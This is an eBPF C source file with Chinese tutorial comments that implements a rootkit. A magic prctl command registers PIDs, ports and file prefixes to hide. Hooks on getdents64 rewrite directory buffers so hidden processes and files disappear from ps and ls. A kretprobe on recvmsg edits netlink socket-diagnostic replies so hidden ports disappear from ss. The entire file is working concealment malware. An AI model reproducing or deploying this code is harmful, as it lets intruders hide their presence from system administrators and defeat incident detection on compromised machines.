#include "../vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

#include "stealth.bpf.h"

SEC("kprobe/__x64_sys_prctl")
int hk_prctl(struct pt_regs *ctx)
{
    int option = (int)PT_REGS_PARM1(ctx);
    unsigned long arg2 = PT_REGS_PARM2(ctx);
    unsigned long arg3 = PT_REGS_PARM3(ctx);

    /* 只处理我们自定义的魔数，其他 prctl 调用直接放行 */
    if (option != PRCTL_MAGIC)
        return 0;

    int cmd = (int)arg2;
    unsigned long val = arg3;

    /* 读取全局开关状态，key 固定为 0 */
    __u32 k = 0;
    __u8 *state = bpf_map_lookup_elem(&stealth_state, &k);
    if (!state)
        return 0;

    DBG_PRINT("prctl cmd=0x%x val=%lu\n", cmd, val);

    switch (cmd) {
    case PRCTL_CMD_HIDE_PID: {
        __u32 pid = (__u32)val;
        if (pid > 0) {
            __u8 v = 1;
            bpf_map_update_elem(&hidden_pids, &pid, &v, BPF_ANY);
            DBG_PRINT("hide pid=%u\n", pid);
        }
        break;
    }
    case PRCTL_CMD_HIDE_PORT: {
        __u16 port = (__u16)val;
        if (port > 0) {
            __u8 v = 1;
            bpf_map_update_elem(&hidden_ports, &port, &v, BPF_ANY);
            DBG_PRINT("hide port=%u\n", port);
        }
        break;
    }
    case PRCTL_CMD_HIDE_FILE: {
        char buf[PREFIX_MAXLEN];
        if (val) {
            int len = bpf_probe_read_user_str(buf, sizeof(buf), (void *)val);
            if (len > 0 && len < PREFIX_MAXLEN) {
                __u32 h = hash_prefix(buf, len);
                __u8 v = 1;
                bpf_map_update_elem(&hidden_prefixes, &h, &v, BPF_ANY);
                DBG_PRINT("hide file prefix=%s hash=%u\n", buf, h);
            }
        }
        break;
    }
    case PRCTL_CMD_STEALTH: {
        *state = (__u8)val;
        DBG_PRINT("stealth state=%u\n", (__u8)val);
        break;
    }
    case PRCTL_CMD_CLEAR: {
        *state = 0;
        DBG_PRINT("clear: stealth disabled\n");
        break;
    }
    default:
        break;
    }

    return 0;
}

/*
 * ==================== 进程/文件隐藏（getdents64）====================
 *
 * ps、ls /proc 等命令底层调用 getdents64 枚举目录项
 * Hook 住系统调用入口保存缓冲区地址，在出口修改缓冲区内容来隐藏指定条目
 */

/*
 * getdents64 入口时保存用户空间缓冲区地址
 * key = pid_tgid（高32位是PID，低32位是TID，用于区分不同线程）
 * value = 用户空间 linux_dirent64 缓冲区的地址
 * 这样在系统调用返回时（exit hook）才能找到对应的缓冲区去修改
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, long unsigned int);
} bufMap SEC(".maps");

/*
 * 保存上一个 dirent 条目的地址，用于隐藏时修改其 d_reclen
 * 隐藏原理：把前一个条目的 d_reclen 加上当前条目的长度，
 * 这样用户空间遍历时会直接跳过被隐藏的条目
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, long unsigned int);
} patchMap SEC(".maps");

/*
 * 记录当前已处理到缓冲区的哪个字节位置
 * eBPF 循环最多执行 200 次（verifier 限制），大目录可能一次处理不完
 * 通过此 map 记录进度，配合 tail_call 可实现断点续读（本版本暂未实现）
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, __u32);
} bytesReadMap SEC(".maps");

/*
 * Hook getdents64 系统调用的入口，记录用户空间缓冲区地址
 *
 * SEC("tp/syscalls/sys_enter_getdents64") 使用 tracepoint 而非 kprobe
 * tracepoint 是内核预埋的稳定钩子点，跨内核版本兼容性比 kprobe 好
 *
 * struct trace_event_raw_sys_enter *ctx 是 tracepoint 的上下文结构
 * ctx->args[] 数组按顺序存储系统调用的参数：
 *   args[0] = fd（文件描述符）
 *   args[1] = dirp（用户空间 dirent 缓冲区指针）
 *   args[2] = count（缓冲区大小）
 */
SEC("tp/syscalls/sys_enter_getdents64")
int hk_getdents64_in(struct trace_event_raw_sys_enter *ctx)
{
    __u32 k = 0;
    __u8 *state = bpf_map_lookup_elem(&stealth_state, &k);
    if (!state || !*state)
        return 0;

    /*
     * bpf_get_current_pid_tgid: 获取当前进程的 pid_tgid
     * 高 32 位是 TGID（用户空间看到的 PID），低 32 位是 TID（线程 ID）
     * 用它作为 map 的 key，可以在 enter 和 exit 两个 hook 之间传递数据
     */
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&bufMap, &pid_tgid, &dirp, BPF_ANY);
    return 0;
}

/*
 * bpf_loop 回调的上下文，在 hide_dirent_cb 和主 hook 之间传递状态
 */
struct dirent_ctx {
    __u64 pid_tgid;
    long unsigned int buff_addr;
    int total_bytes;
    unsigned int bpos;
};

/*
 * bpf_loop 回调：每次处理一个 dirent 条目
 * 返回 0 继续迭代，返回 1 停止迭代
 */
static long hide_dirent_cb(__u32 index, struct dirent_ctx *ctx)
{
    if (ctx->bpos >= (unsigned int)ctx->total_bytes)
        return 1; /* 已处理完所有条目，停止 */

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(ctx->buff_addr + ctx->bpos);
    __u16 d_reclen = 0;
    char filename[32];

    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
    if (d_reclen == 0)
        return 1;

    BPF_CORE_READ_USER_STR_INTO(&filename, dirp, d_name);

    bool hide = false;

    /* 判断文件名是否是纯数字（即 /proc 下的 PID 目录） */
    if (filename[0] >= '1' && filename[0] <= '9') {
        __u32 pid = 0;
        bool is_numeric = true;
        #pragma unroll
        for (int j = 0; j < 10; j++) {
            if (filename[j] >= '0' && filename[j] <= '9') {
                pid = pid * 10 + (filename[j] - '0');
            } else if (filename[j] == '\0') {
                break;
            } else {
                is_numeric = false;
                break;
            }
        }
        if (is_numeric) {
            __u8 *found = bpf_map_lookup_elem(&hidden_pids, &pid);
            if (found) {
                hide = true;
                DBG_PRINT("getdents64_out: match pid=%u -> hide\n", pid);
            }
        }
    }

    /* 判断文件名是否匹配隐藏前缀 */
    if (!hide && is_prefix_hidden(filename, sizeof(filename))) {
        hide = true;
        DBG_PRINT("getdents64_out: match prefix filename=%s -> hide\n", filename);
    }

    if (hide) {
        long unsigned int *pbuff_addr_prev = bpf_map_lookup_elem(&patchMap, &ctx->pid_tgid);
        if (pbuff_addr_prev) {
            struct linux_dirent64 *dirp_prev = (struct linux_dirent64 *)*pbuff_addr_prev;
            __u16 d_reclen_prev = 0;
            bpf_probe_read_user(&d_reclen_prev, sizeof(d_reclen_prev), &dirp_prev->d_reclen);
            __u16 d_reclen_new = d_reclen_prev + d_reclen;
            bpf_probe_write_user(&dirp_prev->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
            DBG_PRINT("getdents64_out: patch prev d_reclen %u->%u\n", d_reclen_prev, d_reclen_new);
        } else {
            /* 第一个条目无前驱，清零 d_ino，glibc readdir 会跳过 inode=0 的条目 */
            __u64 zero_ino = 0;
            bpf_probe_write_user(&dirp->d_ino, &zero_ino, sizeof(zero_ino));
            DBG_PRINT("getdents64_out: first entry, zero d_ino\n");
        }
    } else {
        long unsigned int dirp_addr = (long unsigned int)dirp;
        bpf_map_update_elem(&patchMap, &ctx->pid_tgid, &dirp_addr, BPF_ANY);
    }

    ctx->bpos += d_reclen;
    return 0;
}

/*
 * Hook getdents64 系统调用的出口，在内核填充完 dirent 缓冲区后修改内容
 *
 * sys_exit_getdents64 在 getdents64 即将返回用户空间时触发
 * 此时内核已将目录项写入用户空间缓冲区，我们在这里修改缓冲区来隐藏特定条目
 *
 * 隐藏原理（linux_dirent64 链表修改）：
 *   内核用链表方式组织 dirent，每个条目有 d_reclen 字段指向下一条目
 *   把【前一条目的 d_reclen】加上【要隐藏条目的 d_reclen】
 *   用户空间遍历时就会直接跳过被隐藏的条目，实现隐藏效果
 *
 * bpf_loop（内核 5.17+）：突破 verifier 对静态循环上界的限制，支持任意数量目录项
 */
SEC("tp/syscalls/sys_exit_getdents64")
int hk_getdents64_out(struct trace_event_raw_sys_exit *ctx)
{
    __u32 k = 0;
    __u8 *state = bpf_map_lookup_elem(&stealth_state, &k);
    if (!state || !*state)
        return 0;

    int total_bytes_read = ctx->ret;
    if (total_bytes_read <= 0)
        return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid();

    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&bufMap, &pid_tgid);
    if (!pbuff_addr)
        return 0;

    struct dirent_ctx loop_ctx = {
        .pid_tgid   = pid_tgid,
        .buff_addr  = *pbuff_addr,
        .total_bytes = total_bytes_read,
        .bpos       = 0,
    };

    /*
     * bpf_loop: 内核 5.17+ 辅助函数，回调最多执行 nr_loops 次
     * 突破了传统 for 循环需要静态上界的 verifier 限制
     * 第四个参数 flags 目前必须为 0
     */
    bpf_loop(total_bytes_read, hide_dirent_cb, &loop_ctx, 0);

    bpf_map_delete_elem(&bufMap, &pid_tgid);
    bpf_map_delete_elem(&patchMap, &pid_tgid);
    return 0;
}

/*
 * ==================== 端口隐藏（netlink）====================
 *
 * ss 命令走 netlink 套接字直接向内核请求网络状态，不经过 /proc
 * 需要 Hook __sys_recvmsg，拦截 netlink 响应消息，过滤掉隐藏端口的记录
 */

/* netlink hook 线程上下文，保存 recvmsg 的缓冲区地址 */
struct recv_ctx { void *buf; };

/*
 * netlink 入口时保存用户空间接收缓冲区地址
 * key = pid_tgid，value = 缓冲区地址
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct recv_ctx);
} sd_nl_ctx SEC(".maps");

/*
 * Hook __sys_recvmsg 入口，记录接收缓冲区地址
 * ss 调用 recvmsg 从内核收取 netlink 响应，我们在这里记录缓冲区地址
 * 在出口 hook 中修改这块内存，移除隐藏端口对应的 netlink 消息
 */
SEC("kprobe/__sys_recvmsg")
int sd_nl_in(struct pt_regs *ctx)
{
    __u32 k = 0;
    __u8 *e = bpf_map_lookup_elem(&stealth_state, &k);
    if (!e || !*e) return 0;

    struct user_msghdr *msg = (void *)PT_REGS_PARM2(ctx);
    if (!msg) return 0;

    void *msg_iov = 0;
    struct iovec iov;
    bpf_probe_read_user(&msg_iov, 8, &msg->msg_iov);
    if (!msg_iov) return 0;
    bpf_probe_read_user(&iov, sizeof(iov), msg_iov);
    if (!iov.iov_base) return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct recv_ctx r = { .buf = iov.iov_base };
    bpf_map_update_elem(&sd_nl_ctx, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * Hook __sys_recvmsg 出口，修改 netlink 响应过滤掉隐藏端口
 *
 * netlink 消息格式：
 *   [nlmsghdr(16字节)] [消息体...]
 *   nlmsghdr.nlmsg_len  (4字节, offset=0): 消息总长度
 *   nlmsghdr.nlmsg_type (2字节, offset=4): 消息类型
 *
 * SOCK_DIAG_BY_FAMILY(20) 类型的消息包含 socket 信息（端口等）
 * 隐藏方式与 dirent 相同：把前一条消息的 len 加上当前消息的 len，跳过当前消息
 */
SEC("kretprobe/__sys_recvmsg")
int sd_nl_out(struct pt_regs *ctx)
{
    __u32 k = 0;
    __u8 *e = bpf_map_lookup_elem(&stealth_state, &k);
    if (!e || !*e) return 0;

    long ret = PT_REGS_RC(ctx);
    if (ret <= 0) return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct recv_ctx *r = bpf_map_lookup_elem(&sd_nl_ctx, &tid);
    if (!r || !r->buf) {
        bpf_map_delete_elem(&sd_nl_ctx, &tid);
        return 0;
    }

    void *buf = r->buf;
    long off = 0, prev_off = -1;
    __u32 prev_len = 0;

    #pragma unroll
    for (int i = 0; i < 32; i++) {
        if (off >= ret || off + NLMSG_HDRLEN > ret) break;

        __u32 len; __u16 type;
        if (bpf_probe_read_user(&len, 4, buf + off) < 0) break;
        if (len < NLMSG_HDRLEN || off + len > ret) break;
        bpf_probe_read_user(&type, 2, buf + off + 4);

        int hide = 0;
        if (type == SOCK_DIAG_BY_FAMILY && len >= NLMSG_HDRLEN + 8) {
            __u16 sp, dp;
            /* 消息体偏移 4 和 6 处分别是源端口和目的端口（网络字节序） */
            bpf_probe_read_user(&sp, 2, buf + off + NLMSG_HDRLEN + 4);
            bpf_probe_read_user(&dp, 2, buf + off + NLMSG_HDRLEN + 6);
            __u16 sph = bpf_ntohs(sp), dph = bpf_ntohs(dp);
            if (bpf_map_lookup_elem(&hidden_ports, &sph) ||
                bpf_map_lookup_elem(&hidden_ports, &dph)) {
                hide = 1;
            }
        }

        if (hide) {
            if (prev_off >= 0) {
                __u32 new_len = prev_len + NLMSG_ALIGN(len);
                bpf_probe_write_user(buf + prev_off, &new_len, 4);
                prev_len = new_len;
            } else {
                /* 第一条消息无法用前一条覆盖，清零消息体第一个字节使其失效 */
                __u8 zero = 0;
                bpf_probe_write_user(buf + off + NLMSG_HDRLEN, &zero, 1);
                prev_off = off;
                prev_len = len;
            }
        } else {
            prev_off = off;
            prev_len = len;
        }
        off += NLMSG_ALIGN(len);
    }

    bpf_map_delete_elem(&sd_nl_ctx, &tid);
    return 0;
}
